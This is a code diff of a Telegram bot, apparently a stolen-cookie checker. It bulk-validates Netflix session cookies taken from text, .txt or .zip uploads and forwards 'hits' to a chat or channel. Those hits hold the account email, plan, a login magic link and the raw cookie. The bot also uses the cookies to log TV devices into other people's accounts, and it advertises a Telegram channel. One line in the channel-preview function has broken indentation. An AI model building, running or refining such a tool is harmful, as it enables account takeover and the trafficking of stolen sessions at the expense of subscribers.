@@ -184,41 +184,60 @@ def call_api(endpoint, payload):
         pass 
     return None
 
-def check_cookie(cookie_input):
+def parse_smart_cookie(cookie_input):
     cookie_input = cookie_input.strip()
+    netflix_id_val = None
     
-    if cookie_input.startswith('[') or cookie_input.startswith('{'):
+    if cookie_input.startswith('[') and cookie_input.endswith(']'):
         try:
             json_c = json.loads(cookie_input)
-            if isinstance(json_c, list):
-                for c in json_c:
-                    if c.get('name') == 'NetflixId':
-                        cookie_input = c.get('value')
-                        break
-            elif isinstance(json_c, dict):
-                if 'NetflixId' in json_c: cookie_input = json_c['NetflixId']
+            for c in json_c:
+                if c.get('name') == 'NetflixId':
+                    netflix_id_val = c.get('value')
+                    break
         except: pass
+    
+    if not netflix_id_val:
+        if "NetflixId=" in cookie_input:
+            match = re.search(r"NetflixId=([^;]+)", cookie_input)
+            if match: netflix_id_val = match.group(1)
+        else:
+            netflix_id_val = cookie_input
+            
+    if netflix_id_val and "%" in netflix_id_val:
+        netflix_id_val = urllib.parse.unquote(netflix_id_val)
+        
+    return netflix_id_val
 
-    if "%" in cookie_input: cookie_input = urllib.parse.unquote(cookie_input)
-    if cookie_input.lower().startswith("cookie:"): cookie_input = cookie_input.split(":", 1)[1].strip()
+def build_playwright_cookies(cookie_input, nid_val):
+    p_cookies = []
+    if cookie_input.startswith('['):
+        try:
+            json_c = json.loads(cookie_input)
+            for c in json_c:
+                p_cookies.append({
+                    'name': c.get('name'),
+                    'value': c.get('value'),
+                    'domain': c.get('domain', '.netflix.com'),
+                    'path': c.get('path', '/')
+                })
+            return p_cookies
+        except: pass
     
     cookie_str = cookie_input
-    if "NetflixId" not in cookie_input and len(cookie_input) > 50 and "=" not in cookie_input:
-        cookie_str = f"NetflixId={cookie_input}"
+    if "NetflixId" not in cookie_input: cookie_str = f"NetflixId={cookie_input}"
+    for chunk in cookie_str.split(';'):
+        if '=' in chunk:
+            parts = chunk.strip().split('=', 1)
+            if len(parts) == 2:
+                p_cookies.append({'name': parts[0], 'value': parts[1], 'domain': '.netflix.com', 'path': '/'})
+    return p_cookies
 
-    netflix_id_val = None
-    nid_match = re.search(r"NetflixId=([^;]+)", cookie_str)
-    if nid_match: netflix_id_val = nid_match.group(1)
-    elif "NetflixId" not in cookie_str and len(cookie_str) > 50: netflix_id_val = cookie_str.strip()
-    
-    playwright_cookies = []
-    try:
-        for chunk in cookie_str.split(';'):
-            if '=' in chunk:
-                parts = chunk.strip().split('=', 1)
-                if len(parts) == 2:
-                    playwright_cookies.append({'name': parts[0], 'value': parts[1], 'domain': '.netflix.com', 'path': '/'})
-    except: return {"valid": False, "msg": "Cookie Parse Error"}
+def check_cookie(cookie_input):
+    netflix_id_val = parse_smart_cookie(cookie_input)
+    if not netflix_id_val: return {"valid": False, "msg": "Invalid Cookie Format"}
+
+    playwright_cookies = build_playwright_cookies(cookie_input, netflix_id_val)
 
     api_response = None
     api_link = None
@@ -277,7 +296,7 @@ def check_cookie(cookie_input):
 
 def main():
     print(f"{Fore.RED}========================================")
-    print(f"{Fore.WHITE}   NETFLIX FAST CHECKER BOT (TG)        ")
+    print(f"{Fore.WHITE}   NETFLIX SMART CHECKER BOT (TG)       ")
     print(f"{Fore.RED}========================================{Style.RESET_ALL}\n")
     keep_alive()
 
@@ -324,7 +343,20 @@ def main():
         kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
         kb.add("📩 Send Here (DM)", "📡 Send to Channel")
         kb.add("📺 TV Login", "🛑 Stop System")
-        bot.send_message(message.chat.id, "**🔥 Netflix Ultra-Fast Scraper V32**\n\n👋 **Welcome!** Select Mode to Begin:", reply_markup=kb, parse_mode='Markdown')
+        
+        welcome_msg = (
+            "**🔥 Netflix Direct Scraper V32 (Smart Edition)**\n\n"
+            "👋 **Welcome!** Choose a mode below to start.\n\n"
+            "📁 **Supported Inputs:**\n"
+            "• Direct Text Message\n"
+            "• `.txt` File\n"
+            "• `.zip` File (containing .txt)\n\n"
+            "🍪 **Supported Cookie Formats:**\n"
+            "1️⃣ **Raw Format:**\n`NetflixId=ct%3DBgjHl...`\n\n"
+            "2️⃣ **JSON Format:**\n`[{\"name\": \"NetflixId\", \"value\": \"...\"}]`\n\n"
+            "👇 **Select Mode to Begin:**"
+        )
+        bot.send_message(message.chat.id, welcome_msg, reply_markup=kb, parse_mode='Markdown')
 
     @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
     def verify_join(call):
@@ -338,17 +370,25 @@ def main():
 
     @bot.message_handler(func=lambda m: m.text == "📺 TV Login")
     def tv_login_start(message):
-        msg = bot.reply_to(message, "📺 **TV Login Mode Activated**\n\n1️⃣ Please send your **Netflix Cookie** first.")
+        msg = bot.reply_to(message, "📺 **TV Login Mode Activated**\n\n1️⃣ Please send your **Netflix Cookie** first (JSON or Raw).")
         bot.register_next_step_handler(msg, process_tv_cookie)
 
     def process_tv_cookie(message):
         cookie = message.text.strip()
-        nid_match = re.search(r"NetflixId=([^;]+)", cookie)
-        netflix_id_val = nid_match.group(1) if nid_match else cookie
+        msg = bot.reply_to(message, "⏳ **Checking Cookie Validity...** Please wait.")
         
-        if len(netflix_id_val) < 50: return bot.reply_to(message, "❌ Invalid Cookie length. Try again by clicking '📺 TV Login'.")
-        msg = bot.reply_to(message, "✅ **Cookie Validated!**\n\n2️⃣ Now enter the **8-Digit TV Code** shown on your TV screen.")
-        bot.register_next_step_handler(msg, lambda m: execute_tv_login(m, netflix_id_val))
+        res = check_cookie(cookie)
+        
+        if not res.get("valid"):
+            bot.edit_message_text(f"❌ **Invalid or Dead Cookie!**\n{res.get('msg', 'Try another one.')}\n\nClick '📺 TV Login' to try again.", chat_id=message.chat.id, message_id=msg.message_id)
+            return
+
+        netflix_id_clean = parse_smart_cookie(cookie)
+        plan_name = res.get('data', {}).get('plan', 'Premium')
+        country_name = res.get('country', 'Unknown')
+        
+        bot.edit_message_text(f"✅ **Cookie Validated!**\n👑 **Plan:** {plan_name}\n🌍 **Region:** {country_name}\n\n2️⃣ Now enter the **8-Digit TV Code** shown on your TV screen.", chat_id=message.chat.id, message_id=msg.message_id)
+        bot.register_next_step_handler(message, lambda m: execute_tv_login(m, netflix_id_clean))
 
     def execute_tv_login(message, netflix_id):
         tv_code = message.text.strip()
@@ -371,17 +411,38 @@ def main():
         user_modes[message.chat.id] = {'target': message.chat.id, 'stop': False}
         bot.reply_to(message, "**✅ DM Mode Active.** Send file or text now.", parse_mode='Markdown')
 
+    # --- ADVANCED CHANNEL VERIFICATION ---
     @bot.message_handler(func=lambda m: m.text == "📡 Send to Channel")
     def mode_ch(message):
-        msg = bot.reply_to(message, "**📡 Enter Channel ID** (e.g., -100xxxx):", parse_mode='Markdown')
-        bot.register_next_step_handler(msg, save_ch)
+        msg = bot.reply_to(message, "📡 **Enter Channel ID** (e.g., `-100xxxx`):\n_Make sure the bot is added as an Admin in that channel._", parse_mode='Markdown')
+        bot.register_next_step_handler(msg, preview_ch)
 
-    def save_ch(message):
+    def preview_ch(message):
         try:
             chat_id = int(message.text.strip())
-            user_modes[message.chat.id] = {'target': chat_id, 'stop': False}
-            bot.reply_to(message, "**✅ Channel Verified.** Hits will be sent there.", parse_mode='Markdown')
-        except: bot.reply_to(message, "❌ Invalid ID.")
+            # Check if bot can access the channel and get its name
+        chat = bot.get_chat(chat_id)
+            chat_name = chat.title or "Unknown Channel"
+            
+            markup = types.InlineKeyboardMarkup()
+            markup.add(
+                types.InlineKeyboardButton("✅ Confirm", callback_data=f"conf_ch_{chat_id}"),
+                types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_ch")
+            )
+            bot.reply_to(message, f"📡 **Channel Found!**\n\n**Name:** {chat_name}\n**ID:** `{chat_id}`\n\nIs this correct?", reply_markup=markup, parse_mode='Markdown')
+        except Exception as e:
+            bot.reply_to(message, "❌ **Error!** Either the ID is invalid, or the bot is NOT an Admin in that channel.", parse_mode='Markdown')
+
+    @bot.callback_query_handler(func=lambda call: call.data.startswith("conf_ch_") or call.data == "cancel_ch")
+    def handle_ch_confirmation(call):
+        if call.data == "cancel_ch":
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+            bot.send_message(call.message.chat.id, "❌ **Action Cancelled.** Select a mode again.", parse_mode='Markdown')
+        else:
+            chat_id = int(call.data.split("conf_ch_")[1])
+            user_modes[call.message.chat.id] = {'target': chat_id, 'stop': False}
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+            bot.send_message(call.message.chat.id, f"✅ **Channel Set Successfully!**\nHits will be sent to `{chat_id}`.\n\nNow send your cookies.", parse_mode='Markdown')
 
     @bot.message_handler(content_types=['document', 'text'])
     def handle_input(message):
@@ -390,12 +451,13 @@ def main():
         if not check_sub(uid): return send_force_join(uid)
             
         mode = user_modes.get(uid)
+        text_content = message.text.strip() if message.text else ""
         
-        if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
+        if text_content and (text_content.startswith("/") or text_content in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
         if not mode: return bot.reply_to(message, "❌ **Select a mode first!**", parse_mode='Markdown')
         if mode.get('stop'): return bot.reply_to(message, "🛑 **System is stopped.**\nClick a Mode button to resume.")
 
-        cookies = []
+        valid_cookies = []
         try:
             if message.content_type == 'document':
                 file_info = bot.get_file(message.document.file_id)
@@ -405,12 +467,21 @@ def main():
                     with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
                         for filename in z.namelist():
                             if filename.endswith('.txt'):
-                                with z.open(filename) as f:
-                                    cookies.extend(f.read().decode('utf-8', errors='ignore').splitlines())
-            else:
-                cookies = message.text.splitlines()
-            
-            valid_cookies = [c.strip() for c in cookies if len(c.strip()) > 50 and ("NetflixId" in c or "netflix" in c.lower() or "=" in c)]
+                                with z.open(filename) as f: 
+                                    content = f.read().decode('utf-8', errors='ignore')
+                                    if content.strip().startswith('[') and content.strip().endswith(']'): valid_cookies.append(content)
+                                    else: valid_cookies.extend([line for line in content.splitlines() if len(line) > 20])
+                else: 
+                    content = downloaded_file.decode('utf-8', errors='ignore')
+                    if content.strip().startswith('[') and content.strip().endswith(']'): valid_cookies.append(content)
+                    else: valid_cookies.extend([line for line in content.splitlines() if len(line) > 20])
+            else: 
+                if text_content.startswith('[') and text_content.endswith(']'):
+                    valid_cookies.append(text_content) 
+                elif 'NetflixId=' in text_content and not '\n' in text_content:
+                    valid_cookies.append(text_content) 
+                else:
+                    valid_cookies.extend([line for line in text_content.splitlines() if len(line) > 20])
             
             if not valid_cookies: return bot.reply_to(message, "❌ **No Valid Cookies Found!**", parse_mode='Markdown')
 
@@ -448,7 +519,10 @@ def main():
                             summary += f"Email: {data.get('email', 'N/A')}\n"
                             summary += f"Plan: {data.get('plan', 'N/A')}\n"
                             summary += f"Login: {res.get('magic_link', 'N/A')}\n"
-                            summary += f"Cookie: {cookie}\n"
+                            
+                            if str(cookie).startswith('['): summary += f"Cookie: [JSON Cookie Hidden For Space]\n"
+                            else: summary += f"Cookie: {cookie}\n"
+                            
                             summary += "-"*40 + "\n"
                         summary += "\n========================================\nJoin Channel: https://t.me/F88UF9844\n========================================"
                         
